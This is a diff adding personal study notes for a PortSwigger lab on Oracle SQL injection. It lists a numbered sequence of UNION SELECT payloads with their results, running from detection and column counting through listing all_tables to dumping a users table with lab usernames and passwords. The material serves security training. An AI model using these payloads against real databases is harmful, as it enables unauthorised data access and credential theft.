@@ -282,12 +282,136 @@ Episode10- YouTube Channel AcronProject:
     Lab:    https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
     
     Detection Black Box :
+        1- '
+        2- ''
+            Result: 1 != 2 = Maybe vulnerable
+        
+        3-1  'UNION+SELECT+*+FROM+*--
+             Result: Error
+        3-2  UNION+SELECT+*+FROM+*--
+             Result: Shows is browser
+        
+        4-  UNION+SELECT+*+FROM+dual--
+            Result: Shows is browser
 
+        5- '+UNION+SELECT+NULL--
+            Result: Error
 
+        6- '+UNION+SELECT+NULL,+NULL--
+            Result: Error
+        If your UNION SELECT attack does not query from a table, 
+        you will still need to include the FROM keyword followed by a valid table name. 
 
+        Oracle --> dual
+        7- '+UNION+SELECT+*+FROM+dual--
+            Result: Error
+        8- '+UNION+SELECT+NULL+FROM+dual--
+            Result: Error
+        9- '+UNION+SELECT+'string'+FROM+dual--
+            Result: Error
+        10- '+UNION+SELECT+NULL,+NULL+FROM+dual--
+            Result: shows in browser
+                    so Maybe is two columns
 
+        11- '+UNION+SELECT+'string',+'strin2'+FROM+dual--
+            Result: shows is title and description 
+                    so is injected query
+        
+        Oracle --> all_tables
+        12- SELECT * FROM all_tables
+            +
+            '+UNION+
+            =>  '+UNION+SELECT+*,+NULL+FROM+all_tables--
+            Result: Error
 
+        Oracle --> table_name
+        13- '+UNION+SELECT+table_name,+NULL+FROM+all_tables--
+        
+        Result:
+            APP_ROLE_MEMBERSHIP
+            APP_USERS_AND_ROLES
+            AUDIT_ACTIONS
+            DR$NUMBER_SEQUENCE
+            DR$OBJECT_ATTRIBUTE
+            DR$POLICY_TAB
+            DR$THS
+            DR$THS_PHRASE
+            DUAL
+            HELP
+            HS$_PARALLEL_METADATA
+            HS_BULKLOAD_VIEW_OBJ
+            HS_PARTITION_COL_NAME
+            HS_PARTITION_COL_TYPE
+            IMPDP_STATS
+            KU$NOEXP_TAB
+            KU$_DATAPUMP_MASTER_10_1
+            KU$_DATAPUMP_MASTER_11_1
+            KU$_DATAPUMP_MASTER_11_1_0_7
+            KU$_DATAPUMP_MASTER_11_2
+            KU$_LIST_FILTER_TEMP
+            KU$_LIST_FILTER_TEMP_2
+            NTV2_XML_DATA
+            ODCI_PMO_ROWIDS$
+            ODCI_SECOBJ$
+            ODCI_WARNINGS$
+            OGIS_GEOMETRY_COLUMNS
+            OGIS_SPATIAL_REFERENCE_SYSTEMS
+            OL$
+            OL$HINTS
+            OL$NODES
+            PLAN_TABLE$
+            PRODUCTS
+            PSTUBTBL
+            SDO_COORD_AXES
+            SDO_COORD_AXIS_NAMES
+            SDO_COORD_OPS
+            SDO_COORD_OP_METHODS
+            SDO_COORD_OP_PARAMS
+            SDO_COORD_OP_PARAM_USE
+            SDO_COORD_OP_PARAM_VALS
+            SDO_COORD_OP_PATHS
+            SDO_COORD_REF_SYS
+            SDO_COORD_SYS
+            SDO_CRS_GEOGRAPHIC_PLUS_HEIGHT
+            SDO_CS_CONTEXT_INFORMATION
+            SDO_CS_SRS
+            SDO_DATUMS
+            SDO_DATUMS_OLD_SNAPSHOT
+            SDO_ELLIPSOIDS
+            SDO_ELLIPSOIDS_OLD_SNAPSHOT
+            SDO_PREFERRED_OPS_SYSTEM
+            SDO_PREFERRED_OPS_USER
+            SDO_PRIME_MERIDIANS
+            SDO_PROJECTIONS_OLD_SNAPSHOT
+            SDO_ST_TOLERANCE
+            SDO_TOPO_DATA$
+            SDO_TOPO_RELATION_DATA
+            SDO_TOPO_TRANSACT_DATA
+            SDO_TXN_IDX_DELETES
+            SDO_TXN_IDX_EXP_UPD_RGN
+            SDO_TXN_IDX_INSERTS
+            SDO_UNITS_OF_MEASURE
+            SDO_XML_SCHEMAS
+            SRSNAMESPACE_TABLE
+            STMT_AUDIT_OPTION_MAP
+            SYSTEM_PRIVILEGE_MAP
+            TABLE_PRIVILEGE_MAP
+            USERS_JHEMNF
+            WRI$_ADV_ASA_RECO_DATA
+            WRR$_REPLAY_CALL_FILTER
+            WWV_FLOW_DUAL100
+            WWV_FLOW_LOV_TEMP
+            WWV_FLOW_TEMP_TABLE
+            XDB$XIDX_IMP_T
 
+        14- '+UNION+SELECT+*+FROM+USERS_JHEMNF--
+            Result:
+                administrator
+                sg2jwudxl906esy8wg6d
+                carlos
+                y58ns603wd704fu21dfu
+                wiener
+                96wo94y4musjifp7w8gr
 
 
 
